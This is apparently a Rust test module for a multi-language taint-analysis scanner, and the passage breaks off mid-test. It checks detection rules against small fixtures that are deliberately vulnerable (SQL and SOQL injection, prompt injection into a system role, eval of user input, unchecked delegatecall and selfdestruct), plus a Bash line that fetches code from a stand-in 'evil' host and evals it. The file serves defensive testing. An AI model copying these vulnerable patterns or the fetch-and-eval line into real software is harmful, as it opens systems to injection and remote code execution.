          {role: "system", content: $SINK}
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ObjectLiteralValue { .. }]
            ),
            "sink should compile to ObjectLiteralValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
function handler(req) {
    const user = req.body;
    const msg = { role: "system", content: user };
    return msg;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.body -> object literal value, got {:?}",
            findings
        );
    }

    /// JavaScript near-miss: an object literal with only literal values must
    /// NOT fire.
    #[test]
    fn javascript_bridge_object_literal_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-objlit-prompt-injection-safe
mode: taint
languages: [javascript, typescript]
severity: ERROR
message: "User input flows into a system-prompt object literal"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - pattern: |
          {role: "system", content: $SINK}
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
function handler(req) {
    const user = req.body;
    const msg = { role: "system", content: "fixed instructions" };
    return msg;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an object literal with only literal values must not fire, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ReturnValue (`return $SINK` tainted-return sink) ──

    /// Python: `requests.get(...)` source → `return $SINK` sink. Only
    /// `ReturnValue` can express a sink that is the function's return value.
    #[test]
    fn python_bridge_return_value_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-return-value-sink
mode: taint
languages: [python]
severity: ERROR
message: "External response returned unsanitized"
pattern-sources:
  - pattern: requests.get(...)
pattern-sinks:
  - patterns:
      - pattern: return $SINK
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ReturnValue { .. }]
            ),
            "sink should compile to ReturnValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def fetch():
    data = requests.get("http://api")
    return data
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for requests.get -> return, got {:?}",
            findings
        );
    }

    /// Python near-miss: returning a clean literal must NOT fire.
    #[test]
    fn python_bridge_return_value_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-return-value-sink-safe
mode: taint
languages: [python]
severity: ERROR
message: "External response returned unsanitized"
pattern-sources:
  - pattern: requests.get(...)
pattern-sinks:
  - patterns:
      - pattern: return $SINK
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
def fetch():
    data = requests.get("http://api")
    return "ok"
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "returning a clean literal must not fire, got {:?}",
            findings
        );
    }

    /// The `return $X` shape compiles to `ReturnValue`, but a non-bare return
    /// (`return foo(bar)`) is NOT this shape and must reject.
    #[test]
    fn return_value_shape_rejects_non_bare_return() {
        assert!(parse_return_metavar("return $X").is_some());
        assert!(parse_return_metavar("return $SINK").is_some());
        assert!(parse_return_metavar("return foo($X)").is_none());
        assert!(parse_return_metavar("return \"...\".format(...)").is_none());
        assert!(parse_return_metavar("return").is_none());
        assert!(parse_return_metavar("returnx").is_none());
        assert!(parse_return_metavar("$X").is_none());
    }

    // ── Bridge-level tests: Bash (`curl-eval` / hooks command-injection) ─────
    //
    // These exercise the FULL CLI path: parse_taint_rule → Compiled → check on
    // a real Bash fixture. They MUST NOT call analyze_tree directly.

    /// Real rule `curl-eval`: `$(curl ...)` source → `eval ...` sink.
    #[test]
    fn bash_bridge_curl_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: curl-eval
mode: taint
languages: [bash]
severity: WARNING
message: "Data is being eval'd from a curl command."
pattern-sources:
  - pattern: |
      $(curl ...)
  - pattern: |
      `curl ...`
pattern-sinks:
  - pattern: eval ...
"#,
        );
        assert_eq!(rule.lang, Language::Bash);

        let src = "out=$(curl http://evil)\neval \"$out\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "curl-eval must fire via the compiled bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss for `curl-eval`: eval of a literal, no curl source.
    #[test]
    fn bash_bridge_curl_eval_safe_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: curl-eval
mode: taint
languages: [bash]
severity: WARNING
message: "Data is being eval'd from a curl command."
pattern-sources:
  - pattern: |
      $(curl ...)
pattern-sinks:
  - pattern: eval ...
"#,
        );

        let src = "out=\"ls -la\"\neval \"$out\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "eval of a clean literal must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `hooks-unquoted-variable-bash-taint`: `$(cat | jq ...)` source
    /// → `bash -c ...` / `eval ...` sinks.
    #[test]
    fn bash_bridge_hooks_jq_to_bash_c_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: hooks-unquoted-variable-bash-taint
mode: taint
languages: [bash]
severity: ERROR
message: "Untrusted stdin flows into a command execution sink."
pattern-sources:
  - pattern: $(cat | jq ...)
  - pattern: $(cat)
pattern-sinks:
  - pattern: eval $...SINK
  - pattern: bash -c $...SINK
  - pattern: sh -c $...SINK
"#,
        );

        let src = "data=$(cat | jq -r '.path')\nbash -c \"$data\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "hooks jq -> bash -c must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Solidity (delegatecall / selfdestruct) ───────────

    /// Real rule `delegatecall-to-arbitrary-address`: param `address` source →
    /// `$CONTRACT.delegatecall(...)` sink.
    #[test]
    fn solidity_bridge_delegatecall_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: delegatecall-to-arbitrary-address
mode: taint
languages: [solidity]
severity: ERROR
message: "An attacker may perform delegatecall() to an arbitrary address."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
      - pattern: function $ANY(..., address $CONTRACT, ...) external {...}
    - focus-metavariable: $CONTRACT
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: $CONTRACT.delegatecall(...);
      - pattern: $CONTRACT.delegatecall{gas:$GAS}(...);
"#,
        );
        assert_eq!(rule.lang, Language::Solidity);

        let src = r#"
contract C {
  function run(address target, bytes data) public {
    target.delegatecall(data);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "delegatecall to a param address must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: delegatecall to a hard-coded `address(this)`.
    #[test]
    fn solidity_bridge_delegatecall_to_self_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: delegatecall-to-arbitrary-address
mode: taint
languages: [solidity]
severity: ERROR
message: "An attacker may perform delegatecall() to an arbitrary address."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: $CONTRACT.delegatecall(...);
"#,
        );

        let src = r#"
contract C {
  function run(bytes data) public {
    address(this).delegatecall(data);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "delegatecall to address(this) must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `accessible-selfdestruct`: param `address` source →
    /// `selfdestruct(...)` sink.
    #[test]
    fn solidity_bridge_selfdestruct_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: accessible-selfdestruct
mode: taint
languages: [solidity]
severity: ERROR
message: "Contract can be destructed by anyone."
pattern-sources:
  - patterns:
    - focus-metavariable:
        - $ADDR
    - pattern-either:
        - pattern: function $FUNC(..., address $ADDR, ...) external { ... }
        - pattern: function $FUNC(..., address $ADDR, ...) public { ... }
pattern-sinks:
  - pattern-either:
    - pattern: selfdestruct(...);
    - pattern: suicide(...);
"#,
        );

        let src = r#"
contract C {
  function kill(address payable target) public {
    selfdestruct(target);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "selfdestruct of a param must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Scala (tainted SQL / scalajs eval) ───────────────

    /// Real rule `tainted-sql-string`: request param source → `"$SQL" + ...`
    /// string-building sink.
    #[test]
    fn scala_bridge_tainted_sql_string_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: tainted-sql-string
mode: taint
languages: [scala]
severity: ERROR
message: "User data flows into a manually-constructed SQL string."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: |
          "$SQLSTR" + ...
    - metavariable-regex:
        metavariable: $SQLSTR
        regex: (?i)(select|delete|insert|create|update|alter|drop)\b
"#,
        );
        assert_eq!(rule.lang, Language::Scala);

        let src = r#"
object Ctrl {
  def index(name: String) = {
    val q = "SELECT * FROM t WHERE n = " + name
    db.run(q)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted SQL concat must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: SQL string built only from literals.
    #[test]
    fn scala_bridge_tainted_sql_string_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: tainted-sql-string
mode: taint
languages: [scala]
severity: ERROR
message: "User data flows into a manually-constructed SQL string."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: |
          "$SQLSTR" + ...
"#,
        );

        let src = r#"
object Ctrl {
  def index(name: String) = {
    val q = "SELECT * FROM t WHERE n = " + "admin"
    db.run(q)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only SQL concat must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `scalajs-eval`: request param source → `$JS.eval(...)` sink.
    #[test]
    fn scala_bridge_scalajs_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: scalajs-eval
mode: taint
languages: [scala]
severity: WARNING
message: "eval() of user-controlled data."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern: $JS.eval(...)
"#,
        );

        let src = r#"
object Ctrl {
  def index(code: String) = {
    js.eval(code)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "scalajs eval of param must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Apex (SOQL injection) ────────────────────────────

    /// Real rule `soql-injection-unescaped-param`: any-parameter source →
    /// `Database.query(<... $P ...>)` sink, sanitized by
    /// `String.escapeSingleQuotes`.
    #[test]
    fn apex_bridge_soql_injection_unescaped_param_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped parameter."
pattern-sources:
  - by-side-effect: true
    patterns:
      - pattern: $M(...,String $P,...) { ... }
      - focus-metavariable: $P
pattern-sanitizers:
  - pattern-either:
    - pattern: String.escapeSingleQuotes($P)
    - pattern: Database.query(<... String.escapeSingleQuotes($P) ...>)
pattern-sinks:
  - pattern: Database.query(<... $P ...>)
"#,
        );
        assert_eq!(rule.lang, Language::Apex);

        let src = r#"
public class C {
    public List<Account> find(String p) {
        return Database.query(p);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted Database.query must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: the parameter is escaped via `String.escapeSingleQuotes`
    /// before reaching `Database.query`.
    #[test]
    fn apex_bridge_soql_injection_sanitized_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped parameter."
pattern-sources:
  - by-side-effect: true
    patterns:
      - pattern: $M(...,String $P,...) { ... }
      - focus-metavariable: $P
pattern-sanitizers:
  - pattern-either:
    - pattern: String.escapeSingleQuotes($P)
    - pattern: Database.query(<... String.escapeSingleQuotes($P) ...>)
pattern-sinks:
  - pattern: Database.query(<... $P ...>)
"#,
        );

        let src = r#"
public class C {
    public List<Account> find(String p) {
        String safe = String.escapeSingleQuotes(p);
        return Database.query(safe);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "escaped parameter must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `soql-injection-unescaped-url-param`: chained request-param
    /// read source → `Database.query($SINK,...)` focus-argument sink.
    #[test]
    fn apex_bridge_soql_injection_url_param_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-url-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped URL parameter."
pattern-sources:
  - by-side-effect: true
    pattern: ApexPage.getCurrentPage().getParameters.get($URLPARAM);
pattern-sanitizers:
  - pattern: String.escapeSingleQuotes(...)
pattern-sinks:
  - patterns:
    - pattern: Database.query($SINK,...);
    - focus-metavariable: $SINK
"#,
        );
        assert_eq!(rule.lang, Language::Apex);

        let src = r#"
public class C {
    public List<Account> find() {
        String url = ApexPage.getCurrentPage().getParameters().get('q');
        return Database.query(url);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted URL-param Database.query must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: a literal query, no request-parameter flow.
    #[test]
    fn apex_bridge_soql_injection_url_param_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-url-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped URL parameter."
pattern-sources:
  - by-side-effect: true
    pattern: ApexPage.getCurrentPage().getParameters.get($URLPARAM);
pattern-sanitizers:
  - pattern: String.escapeSingleQuotes(...)
pattern-sinks:
  - patterns:
    - pattern: Database.query($SINK,...);
    - focus-metavariable: $SINK
"#,
        );

        let src = r#"
public class C {
    public List<Account> find() {
        return Database.query('SELECT Id FROM Account');
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal query must not fire, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Swift (sqlite injection) ─────────────────────────

    /// Real rule `swift-potential-sqlite-injection`: an interpolated/concatenated
    /// SQL string source → `sqlite3_exec`/`sqlite3_prepare_v2` focus-argument
    /// sink.
    #[test]
    fn swift_bridge_sqlite_injection_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: swift-potential-sqlite-injection
mode: taint
severity: WARNING
languages:
  - swift
message: "Potential client-side SQL injection."
pattern-sources:
  - pattern-either:
    - pattern: |
        "...\($X)..."
    - pattern: |
        $SQL = "..." + $X
    - pattern: |
        $SQL = $X + "..."
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: sqlite3_exec($DB, $SQL, ...)
      - pattern: sqlite3_prepare_v2($DB, $SQL, ...)
    - focus-metavariable:
      - $SQL
"#,
        );
        assert_eq!(rule.lang, Language::Swift);

        let src = r#"
func handler(input: String) {
    let q = "SELECT * FROM t WHERE n = \(input)"
    sqlite3_exec(db, q, nil, nil, nil)
}
"#;
        let tree = parse_file(src, Language::Swift).expect("swift fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "interpolated SQL into sqlite3_exec must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: a fully-literal SQL string reaches `sqlite3_exec` — no
    /// dynamic interpolation/concatenation, so no finding.
    #[test]
    fn swift_bridge_sqlite_injection_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: swift-potential-sqlite-injection
mode: taint
severity: WARNING
languages:
  - swift
message: "Potential client-side SQL injection."
pattern-sources:
  - pattern-either:
    - pattern: |
        "...\($X)..."
    - pattern: |
        $SQL = "..." + $X
    - pattern: |
        $SQL = $X + "..."
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: sqlite3_exec($DB, $SQL, ...)
      - pattern: sqlite3_prepare_v2($DB, $SQL, ...)
    - focus-metavariable:
      - $SQL
"#,
        );

        let src = r#"
func handler() {
    let q = "SELECT * FROM t"
    sqlite3_exec(db, q, nil, nil, nil)
}
"#;
        let tree = parse_file(src, Language::Swift).expect("swift fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal SQL must not fire, got {:?}",
            findings
        );
    }

    // ── Parameter-as-source shape: focus-metavariable + function-signature
    //    pattern-inside inside a taint pattern-sources block ────────────────

    /// JS `lang/detect-child-process` shape: a `patterns:` source block with a
    /// `pattern-inside: function ...(...,$FUNC,...)` context plus
    /// `focus-metavariable: $FUNC`. Compiles to the any-parameter wildcard
    /// source. A function parameter flowing to `exec(...)` must fire.
    #[test]
    fn js_param_source_focus_inside_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-child-process-param
mode: taint
languages: [javascript]
severity: ERROR
message: "Function argument reaches child_process.exec"
pattern-sources:
  - patterns:
      - pattern-inside: |
          function ... (...,$FUNC,...) {
            ...
          }
      - focus-metavariable: $FUNC
pattern-sinks:
  - pattern: exec($CMD,...)
"#,
        );
        // The source block must compile to the any-parameter wildcard.
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
function run(name, cmd) {
  exec(cmd);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a function parameter reaching exec() must fire, got {:?}",
            findings
        );
    }

    /// JS near-miss: the value reaching `exec(...)` is NOT a function parameter
    /// (it is a module-level constant), so the wildcard-param source must not
    /// taint it and the rule must not fire.
    #[test]
    fn js_param_source_non_param_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-child-process-param-safe
mode: taint
languages: [javascript]
severity: ERROR
message: "Function argument reaches child_process.exec"
pattern-sources:
  - patterns:
      - pattern-inside: |
          function ... (...,$FUNC,...) {
            ...
          }
      - focus-metavariable: $FUNC
pattern-sinks:
  - pattern: exec($CMD,...)
"#,
        );

        // A literal local, not a parameter, reaching exec(). No parameter flows
        // anywhere, so the any-parameter seed taints nothing relevant.
        let src = r#"
function run() {
  const cmd = "ls -la";
  exec(cmd);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a non-parameter constant must not fire, got {:?}",
            findings
        );
    }

    /// Python AWS-Lambda shape: `pattern: $EVENT` plus a `pattern-either:` of
    /// `pattern-inside:` handler signatures binding `$EVENT` as a parameter.
    /// A handler parameter flowing to `subprocess.call(...)` must fire.
    #[test]
    fn python_param_source_bare_pattern_inside_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-lambda-param
mode: taint
languages: [python]
severity: ERROR
message: "Lambda event reaches subprocess"
pattern-sources:
  - patterns:
      - pattern: $EVENT
      - pattern-inside: |
          def $HANDLER($EVENT, $CONTEXT):
            ...
pattern-sinks:
  - pattern: subprocess.call($X)
"#,
        );
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
def handler(event, context):
    cmd = event
    subprocess.call(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "handler param reaching subprocess.call must fire, got {:?}",
            findings
        );
    }

    /// Python near-miss: same rule, but the value reaching the sink is a
    /// hardcoded constant unrelated to any parameter — must not fire.
    #[test]
    fn python_param_source_constant_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-lambda-param-safe
mode: taint
languages: [python]
severity: ERROR
message: "Lambda event reaches subprocess"
pattern-sources:
  - patterns:
      - pattern: $EVENT
      - pattern-inside: |
          def $HANDLER($EVENT, $CONTEXT):
            ...
pattern-sinks:
  - pattern: subprocess.call($X)
"#,
        );

        let src = r#"
def handler(event, context):
    cmd = "echo hello"
    subprocess.call(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a hardcoded constant must not fire, got {:?}",
            findings
        );
    }

    /// A source `patterns:` block that names a focus metavariable which is NOT
    /// a parameter of any function-signature context must NOT compile to the
    /// any-parameter wildcard (guards against over-broad seeding).
    #[test]
    fn non_param_focus_block_is_not_treated_as_param_source() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: not-a-param-source
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern: get_input($X)
      - focus-metavariable: $X
pattern-sinks:
  - pattern: eval($Y)
"#,
        )
        .unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                // The `get_input($X)` pattern is a Call source (expressible), so
                // the block compiles via graceful degradation — NOT to the
                // any-parameter wildcard.
                assert!(
                    !r.spec.sources.iter().any(|m| matches!(
                        m,
                        GenericMatcher::ParamName { names, .. }
                            if names.contains(&crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string())
                    )),
                    "a focus on a call metavar must not become an any-parameter source: {:?}",
                    r.spec.sources
                );
            }
            other => panic!(
                "expected compiled rule, got skip/nottaint: {:?}",
                matches!(other, TaintRuleParse::Skip(_))
            ),
        }
    }

    /// Java AWS-Lambda shape: `focus-metavariable: $EVENT` + a typed
    /// handler-signature `pattern`. A handler parameter flowing to a SQL string
    /// concat sink must fire; the wildcard seeds the typed parameter.
    #[test]
    fn java_param_source_focus_typed_signature_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-lambda-param
mode: taint
languages: [java]
severity: ERROR
message: "Handler param reaches SQL string"
pattern-sources:
  - patterns:
      - focus-metavariable: $EVENT
      - pattern: |
          $RT $HANDLER($TYPE $EVENT, Context $CTX) {
            ...
          }
pattern-sinks:
  - pattern: stmt.executeQuery($Q)
"#,
        );
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
class H {
  String handle(String event, Context ctx) {
    String q = event;
    return stmt.executeQuery(q);
  }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "handler param reaching executeQuery must fire, got {:?}",
            findings
        );
    }

    /// Java near-miss: a hardcoded literal (not a parameter) reaching the sink
    /// must not fire even though the wildcard seeds parameters.
    #[test]
    fn java_param_source_literal_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-lambda-param-safe
mode: taint
languages: [java]
severity: ERROR
message: "Handler param reaches SQL string"
pattern-sources:
  - patterns:
      - focus-metavariable: $EVENT
      - pattern: |
          $RT $HANDLER($TYPE $EVENT, Context $CTX) {
            ...
          }
pattern-sinks:
  - pattern: stmt.executeQuery($Q)
"#,
        );

        let src = r#"
class H {
  String handle(String event, Context ctx) {
    String q = "SELECT 1";
    return stmt.executeQuery(q);
  }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a hardcoded SQL literal must not fire, got {:?}",
            findings
        );
    }

    // ── Focus-on-call-argument SINK shape: focus-metavariable / bare-pattern
    //    focus + a call-context pattern-inside/pattern in a pattern-sinks block.
    //    Each test compiles through the SAME `parse_taint_rule` path the CLI
    //    uses, asserts the compiled SINK is a concrete `Call`/`MethodName`
    //    matcher (never an over-broad bare-node sink), then proves a tainted
    //    value reaching that call FIRES and a clean near-miss does NOT.

    /// PHP `assert-use` shape: `pattern: assert($SINK, ...)` + `pattern: $SINK`
    /// (the focus). Compiles to a concrete `Call { assert }` sink. A tainted
    /// `$_GET` value reaching `assert(...)` must fire.
    #[test]
    fn php_focus_call_sink_concrete_callee_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-assert-use
mode: taint
languages: [php]
severity: ERROR
message: "Tainted value reaches assert()"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - patterns:
      - pattern: assert($SINK, ...)
      - pattern: $SINK
"#,
        );
        // The sink must be the concrete `assert` Call, not a dropped/empty sink.
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::Call { canonical, .. }] if canonical == "assert"
            ),
            "expected a concrete `assert` Call sink, got {:?}",
            rule.spec.sinks
        );

        let src = r#"<?php
function run() {
  $x = $_GET['code'];
  assert($x);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted $_GET value reaching assert() must fire, got {:?}",
            findings
        );
    }

    /// PHP near-miss: the SAME `assert` sink, but the argument is a hardcoded
    /// literal (not tainted) — the call-argument taint gate means it must NOT
    /// fire. Proves the sink is not an over-broad "any assert call" matcher.
    #[test]
    fn php_focus_call_sink_untainted_arg_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-assert-use-safe
mode: taint
languages: [php]
severity: ERROR
message: "Tainted value reaches assert()"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - patterns:
      - pattern: assert($SINK, ...)
      - pattern: $SINK
"#,
        );

        let src = r#"<?php
function run() {
  $x = "1 === 1";
  assert($x);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an untainted literal in assert() must not fire, got {:?}",
            findings
        );
    }

    /// JS `node-mysql-sqli` shape: `focus-metavariable: $QUERY` + a
    /// `pattern-either:` of `pattern-inside: $POOL.query($QUERY, ...)` /
    /// `$POOL.execute($QUERY, ...)` call contexts. Compiles to `MethodName`
    /// sinks for `query`/`execute`. A tainted `req.body` reaching `.query(...)`
    /// must fire.
    #[test]
    fn js_focus_call_sink_method_name_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-mysql-sqli
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted value reaches a SQL query method"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $QUERY
      - pattern-either:
          - pattern-inside: $POOL.query($QUERY, ...)
          - pattern-inside: $POOL.execute($QUERY, ...)
"#,
        );
        // The sink must compile to concrete `query`/`execute` MethodName sinks.
        let mut methods: Vec<&str> = rule
            .spec
            .sinks
            .iter()
            .filter_map(|m| match m {
                GenericMatcher::MethodName { method, .. } => Some(method.as_str()),
                _ => None,
            })
            .collect();
        methods.sort_unstable();
        assert_eq!(
            methods,
            ["execute", "query"],
            "expected query/execute MethodName sinks, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
function run(req, pool) {
  const q = req.body;
  pool.query(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted req.body reaching pool.query() must fire, got {:?}",
            findings
        );
    }

    /// JS near-miss: the focused method-name sink (`query`/`execute`) but the
    /// call is `pool.format(q)` — a DIFFERENT method outside the pinned set —
    /// so the MethodName sinks must NOT fire. Proves the regex pin bounds the
    /// matcher to the listed methods.
    #[test]
    fn js_focus_call_sink_other_method_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-mysql-sqli-safe
mode: taint
